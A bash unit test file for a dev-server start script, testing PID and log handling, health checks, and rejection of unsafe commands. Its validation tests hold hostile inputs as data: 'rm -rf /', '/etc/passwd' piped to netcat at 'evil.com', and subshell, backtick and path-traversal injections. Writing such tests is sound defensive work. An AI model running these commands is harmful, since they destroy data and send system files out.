#!/usr/bin/env bash
# tests/unit/start-dev.test.sh — Unit tests for scripts/start-dev.sh server lifecycle
#
# Tests: worker-id path resolution, default path resolution, already-running detection,
# stale PID handling, log truncation, empty command guard, unsafe command validation
# (semicolon, pipe, subshell, backtick, dotdot), PID file creation, health check
# success, health check timeout, and server-dies-during-startup.
#
# Usage: bash tests/unit/start-dev.test.sh

# NOTE: -e is intentionally omitted — the test uses its own PASS/FAIL counters
set -uo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PASS=0
FAIL=0

log()  { printf "  %s\n" "$*"; }
pass() { PASS=$((PASS + 1)); printf "  \033[32m✓\033[0m %s\n" "$*"; }
fail() { FAIL=$((FAIL + 1)); printf "  \033[31m✗\033[0m %s\n" "$*"; }

assert_eq() {
  local actual="$1" expected="$2" msg="$3"
  if [ "$actual" = "$expected" ]; then
    pass "$msg"
  else
    fail "$msg (expected '$expected', got '$actual')"
  fi
}

assert_contains() {
  local haystack="$1" needle="$2" msg="$3"
  if printf '%s' "$haystack" | grep -qF "$needle"; then
    pass "$msg"
  else
    fail "$msg (expected to contain '$needle')"
  fi
}

assert_not_contains() {
  local haystack="$1" needle="$2" msg="$3"
  if printf '%s' "$haystack" | grep -qF "$needle"; then
    fail "$msg (should NOT contain '$needle')"
  else
    pass "$msg"
  fi
}

# ── Setup: create isolated environment ──────────────────────────────

TMPDIR_ROOT=$(mktemp -d)

MOCK_SCRIPTS_DIR="$TMPDIR_ROOT/scripts"
MOCK_PROJECT_DIR="$TMPDIR_ROOT/project"
mkdir -p "$MOCK_SCRIPTS_DIR" "$MOCK_PROJECT_DIR"

cleanup() {
  # Kill any server processes started during tests
  for pidfile in "$MOCK_SCRIPTS_DIR"/next-dev*.pid; do
    [ -f "$pidfile" ] || continue
    kill "$(cat "$pidfile")" 2>/dev/null || true
  done
  # Kill any direct background jobs (e.g. sleep from already-running test)
  kill $(jobs -p 2>/dev/null) 2>/dev/null || true
  rm -rf "$TMPDIR_ROOT"
}
trap cleanup EXIT

# Create a minimal _config.sh stub — provides only what start-dev.sh needs
cat > "$MOCK_SCRIPTS_DIR/_config.sh" << STUB
SCRIPTS_DIR="$MOCK_SCRIPTS_DIR"
PROJECT_DIR="$MOCK_PROJECT_DIR"
STUB

# Copy the script under test into the mock scripts dir
cp "$REPO_ROOT/scripts/start-dev.sh" "$MOCK_SCRIPTS_DIR/start-dev.sh"

# Create mock curl that succeeds (bin-ok) and fails (bin-fail)
mkdir -p "$TMPDIR_ROOT/bin-ok" "$TMPDIR_ROOT/bin-fail"

printf '#!/usr/bin/env bash\nexit 0\n' > "$TMPDIR_ROOT/bin-ok/curl"
chmod +x "$TMPDIR_ROOT/bin-ok/curl"

printf '#!/usr/bin/env bash\nexit 1\n' > "$TMPDIR_ROOT/bin-fail/curl"
chmod +x "$TMPDIR_ROOT/bin-fail/curl"

# Mock sleep (instant) — used with bin-fail to speed up health check loop
printf '#!/usr/bin/env bash\nexit 0\n' > "$TMPDIR_ROOT/bin-fail/sleep"
chmod +x "$TMPDIR_ROOT/bin-fail/sleep"

# Helper: run start-dev.sh and capture exit code + output
# Arguments:
#   $1 — worker_id (pass "" for no worker_id)
#   $2 — SKYNET_DEV_SERVER_CMD value
#   $3 — extra PATH prefix (for mocking curl/sleep)
# Sets: _rc (exit code), _output (stdout+stderr)
run_start_dev() {
  local worker_id="${1:-}"
  local dev_cmd="${2:-}"
  local extra_path="${3:-}"
  local run_log="$TMPDIR_ROOT/run.log"
  rm -f "$run_log"

  _rc=0
  (
    export SKYNET_DEV_SERVER_CMD="$dev_cmd"
    export SKYNET_DEV_SERVER_URL="http://localhost:0"
    [ -n "$extra_path" ] && export PATH="$extra_path:$PATH"
    if [ -n "$worker_id" ]; then
      bash "$MOCK_SCRIPTS_DIR/start-dev.sh" "$worker_id"
    else
      bash "$MOCK_SCRIPTS_DIR/start-dev.sh"
    fi
  ) > "$run_log" 2>&1 || _rc=$?

  _output=""
  [ -f "$run_log" ] && _output=$(cat "$run_log")
}

# Helper: kill a server by its PID file and clean up
kill_server() {
  local pidfile="$1"
  if [ -f "$pidfile" ]; then
    kill "$(cat "$pidfile")" 2>/dev/null || true
    rm -f "$pidfile"
  fi
}

echo "start-dev.test.sh — unit tests for scripts/start-dev.sh"

# ── Test: worker-id creates suffixed log/pid files ──────────────────

echo ""
log "=== WORKER_ID_PATHS: log/pid files use worker suffix ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "3" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "worker-id: exit code 0"

if [ -f "$MOCK_SCRIPTS_DIR/next-dev-w3.pid" ]; then
  pass "worker-id: PID file created at next-dev-w3.pid"
else
  fail "worker-id: PID file not created at next-dev-w3.pid"
fi

if [ -f "$MOCK_SCRIPTS_DIR/next-dev-w3.log" ]; then
  pass "worker-id: log file created at next-dev-w3.log"
else
  fail "worker-id: log file not created at next-dev-w3.log"
fi

kill_server "$MOCK_SCRIPTS_DIR/next-dev-w3.pid"

# ── Test: no worker-id uses default file names ──────────────────────

echo ""
log "=== DEFAULT_PATHS: log/pid files use default names ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "default paths: exit code 0"

if [ -f "$MOCK_SCRIPTS_DIR/next-dev.pid" ]; then
  pass "default paths: PID file created at next-dev.pid"
else
  fail "default paths: PID file not created at next-dev.pid"
fi

if [ -f "$MOCK_SCRIPTS_DIR/next-dev.log" ]; then
  pass "default paths: log file created at next-dev.log"
else
  fail "default paths: log file not created at next-dev.log"
fi

kill_server "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Test: already-running detection ─────────────────────────────────

echo ""
log "=== ALREADY_RUNNING: exits 0 when server already running ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

# Start a long-running process to simulate an existing server
sleep 300 &
existing_pid=$!
echo "$existing_pid" > "$MOCK_SCRIPTS_DIR/next-dev.pid"

run_start_dev "" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "already running: exit code 0"
assert_contains "$_output" "already running" "already running: reports already running"

kill "$existing_pid" 2>/dev/null || true
wait "$existing_pid" 2>/dev/null || true
rm -f "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Test: stale PID file is ignored ─────────────────────────────────

echo ""
log "=== STALE_PID: stale PID file does not block server start ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

# Write a PID file with a dead PID
echo "99999" > "$MOCK_SCRIPTS_DIR/next-dev.pid"

run_start_dev "" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "stale pid: exit code 0"
assert_contains "$_output" "Dev server started" "stale pid: server was started"

# Verify PID file now has a new (live) PID
if [ -f "$MOCK_SCRIPTS_DIR/next-dev.pid" ]; then
  new_pid=$(cat "$MOCK_SCRIPTS_DIR/next-dev.pid")
  if [ "$new_pid" != "99999" ]; then
    pass "stale pid: PID file updated with new PID"
  else
    fail "stale pid: PID file still has stale PID"
  fi
else
  fail "stale pid: PID file missing after start"
fi

kill_server "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Test: log truncation when over 5000 lines ───────────────────────

echo ""
log "=== LOG_TRUNCATE: log truncated when over 5000 lines ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

# Create a log file with 6000 lines
LOG_FILE="$MOCK_SCRIPTS_DIR/next-dev.log"
seq 1 6000 > "$LOG_FILE"

run_start_dev "" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "log truncate: exit code 0"

# After truncation (tail -5000) + "Starting dev server..." line = 5001
line_count=$(wc -l < "$LOG_FILE" | tr -d ' ')
if [ "$line_count" -le 5002 ]; then
  pass "log truncate: log truncated (got $line_count lines)"
else
  fail "log truncate: expected <=5002 lines, got $line_count"
fi

# First line should be "1001" (6000 - 5000 + 1)
first_line=$(head -1 "$LOG_FILE")
assert_eq "$first_line" "1001" "log truncate: first line is 1001 (kept last 5000)"

kill_server "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Test: small log not truncated ────────────────────────────────────

echo ""
log "=== LOG_NO_TRUNCATE: small log not truncated ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

LOG_FILE="$MOCK_SCRIPTS_DIR/next-dev.log"
seq 1 100 > "$LOG_FILE"

run_start_dev "" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "no truncate: exit code 0"

# 100 original lines + "Starting dev server..." line = 101
first_line=$(head -1 "$LOG_FILE")
assert_eq "$first_line" "1" "no truncate: first line preserved"

kill_server "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Test: empty SKYNET_DEV_SERVER_CMD ───────────────────────────────

echo ""
log "=== EMPTY_CMD: exits 1 when command is empty ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" "" ""
assert_eq "$_rc" "1" "empty cmd: exit code 1"
assert_contains "$_output" "SKYNET_DEV_SERVER_CMD is not set" "empty cmd: error message"

# ── Test: unsafe command — semicolon ─────────────────────────────────

echo ""
log "=== UNSAFE_SEMICOLON: rejects command with semicolon ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" "sleep 1; rm -rf /" ""
assert_eq "$_rc" "1" "semicolon: exit code 1"
assert_contains "$_output" "unsafe characters" "semicolon: error message"

# ── Test: unsafe command — pipe ──────────────────────────────────────

echo ""
log "=== UNSAFE_PIPE: rejects command with pipe ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" "cat /etc/passwd | nc evil.com 80" ""
assert_eq "$_rc" "1" "pipe: exit code 1"
assert_contains "$_output" "unsafe characters" "pipe: error message"

# ── Test: unsafe command — $() subshell ──────────────────────────────

echo ""
log "=== UNSAFE_SUBSHELL: rejects command with \$() ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" 'sleep $(whoami)' ""
assert_eq "$_rc" "1" "subshell: exit code 1"
assert_contains "$_output" "unsafe characters" "subshell: error message"

# ── Test: unsafe command — backtick ──────────────────────────────────

echo ""
log "=== UNSAFE_BACKTICK: rejects command with backtick ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" 'sleep `whoami`' ""
assert_eq "$_rc" "1" "backtick: exit code 1"
assert_contains "$_output" "unsafe characters" "backtick: error message"

# ── Test: unsafe command — dotdot ────────────────────────────────────

echo ""
log "=== UNSAFE_DOTDOT: rejects command with .. ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" 'node ../../evil.js' ""
assert_eq "$_rc" "1" "dotdot: exit code 1"
assert_contains "$_output" "unsafe characters" "dotdot: error message"

# ── Test: PID file contains valid PID ────────────────────────────────

echo ""
log "=== PID_VALID: PID file contains a running process ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "pid valid: exit code 0"

if [ -f "$MOCK_SCRIPTS_DIR/next-dev.pid" ]; then
  recorded_pid=$(cat "$MOCK_SCRIPTS_DIR/next-dev.pid")
  if kill -0 "$recorded_pid" 2>/dev/null; then
    pass "pid valid: recorded PID is a live process"
  else
    fail "pid valid: recorded PID is not alive"
  fi
else
  fail "pid valid: PID file not found"
fi

kill_server "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Test: health check success — no warning ──────────────────────────

echo ""
log "=== HEALTH_OK: no warning when health check succeeds ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "health ok: exit code 0"
assert_contains "$_output" "Dev server started" "health ok: started message"
assert_not_contains "$_output" "WARNING" "health ok: no warning"
assert_not_contains "$_output" "ERROR" "health ok: no error"

kill_server "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Test: health check timeout — warning issued ─────────────────────

echo ""
log "=== HEALTH_TIMEOUT: warning when server does not respond ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

# Use tail -f /dev/null as server (stays alive, no sleep dependency)
# Mock sleep is instant so the 15-iteration loop completes fast
run_start_dev "" "tail -f /dev/null" "$TMPDIR_ROOT/bin-fail"
assert_eq "$_rc" "0" "health timeout: exit code 0 (warning only)"
assert_contains "$_output" "WARNING" "health timeout: warning issued"
assert_contains "$_output" "did not respond" "health timeout: timeout detail"

kill_server "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Test: server dies during startup ─────────────────────────────────

echo ""
log "=== SERVER_DIES: error when process dies during startup ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

# Use "true" as server command — exits immediately.
# With mock sleep (instant), the health check loop runs fast.
# Bash reaps the zombie during external command (mock curl) execution,
# so kill -0 detects the dead process on a subsequent iteration.
run_start_dev "" "true" "$TMPDIR_ROOT/bin-fail"
assert_eq "$_rc" "1" "server dies: exit code 1"
assert_contains "$_output" "died during startup" "server dies: error message"

# PID file should be cleaned up
if [ ! -f "$MOCK_SCRIPTS_DIR/next-dev.pid" ]; then
  pass "server dies: PID file cleaned up"
else
  fail "server dies: PID file should have been removed"
fi

# ── Test: log records startup message ────────────────────────────────

echo ""
log "=== LOG_STARTUP_MSG: log contains startup timestamp ==="

rm -f "$MOCK_SCRIPTS_DIR"/next-dev*

run_start_dev "" "sleep 300" "$TMPDIR_ROOT/bin-ok"
assert_eq "$_rc" "0" "log msg: exit code 0"

if [ -f "$MOCK_SCRIPTS_DIR/next-dev.log" ]; then
  log_content=$(cat "$MOCK_SCRIPTS_DIR/next-dev.log")
  assert_contains "$log_content" "Starting dev server" "log msg: startup message in log"
else
  fail "log msg: log file not found"
fi

kill_server "$MOCK_SCRIPTS_DIR/next-dev.pid"

# ── Summary ──────────────────────────────────────────────────────────

echo ""
TOTAL=$((PASS + FAIL))
log "Results: $PASS/$TOTAL passed, $FAIL failed"
if [ "$FAIL" -eq 0 ]; then
  printf "  \033[32mAll checks passed!\033[0m\n"
else
  printf "  \033[31mSome checks failed!\033[0m\n"
  exit 1
fi
